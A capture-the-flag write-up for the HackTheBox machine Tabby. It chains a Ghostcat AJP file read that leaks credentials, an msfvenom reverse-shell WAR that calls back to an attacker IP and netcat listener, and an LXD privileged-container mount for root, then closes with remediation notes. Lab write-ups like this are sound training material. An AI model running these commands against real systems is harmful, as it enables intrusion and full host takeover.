HTB Tabby: Ghostcat file read to Tomcat deploy to LXD root

retired-machineeasy

Tabby is a retired HackTheBox easy Linux machine chaining three distinct techniques into one ladder. Synopsis: Ghostcat AJP read (CVE-2020-1938) leaks manager creds, a WAR deploy gets a shell, and LXD group membership mounts the host.

$ Enumeration — HTTP plus AJP

# nmap: spot Tomcat plus AJP 8009
nmap -sC -sV -oN tabby.nmap 10.10.10.194

HTTP (Tomcat) plus the AJP connector port 8009 — and an AJP port facing the network next to a Tomcat version in the Ghostcat range is the opening. Unfamiliar ports deserve one search each; 8009 plus Tomcat is a famous pair.

$ Foothold step one — Ghostcat file read

# bash: Ghostcat read of manager config
python3 ghostcat.py 10.10.10.194 8009 --read /WEB-INF/web.xml
python3 ghostcat.py 10.10.10.194 8009 --read /manager/META-INF/context.xml
python3 ghostcat.py 10.10.10.194 8009 --read /WEB-INF/tomcat-users.xml   # manager creds

The AJP file-read exploit pulls deployment descriptors and then tomcat-users.xml from the manager app, revealing manager credentials. File-read bugs that expose config are credential bugs wearing a different hat.

$ Foothold step two — WAR deploy

# bash: build WAR, deploy, catch shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.23 LPORT=4444 -f war > shell.war
# manager GUI (recovered creds) -> Deploy -> upload shell.war -> browse /shell/
nc -lvnp 4444   # shell as tomcat

Log into the Tomcat manager with the recovered creds, upload the malicious WAR, trigger it, catch the shell as the low-privilege tomcat user.

$ Privilege escalation — LXD group

# bash: privileged container, mount host
id   # tomcat user in the lxd group
lxc image copy ubuntu:20.04 local --alias privesc
lxc init privesc pwn -c security.privileged=true
lxc config device add pwn host-root disk source=/ path=/mnt/root recursive=true
lxc start pwn; lxc exec pwn /bin/sh
# inside container: chroot /mnt/root /bin/bash; cat /root/root.txt

LXD group membership is root-equivalent: any member can launch a privileged container with the host filesystem mounted. Flag values redacted per HTB rules; earn them in your own lab.

$ Dead ends

Brute-forcing the manager login (the creds are on disk via Ghostcat — read before guessing) and treating the AJP port as noise.

$ Remediation notes

Upgrade Tomcat past Ghostcat, firewall AJP off the network, rotate creds in deployed configs, and never grant container groups to service accounts. Written by Lucky Thandel.
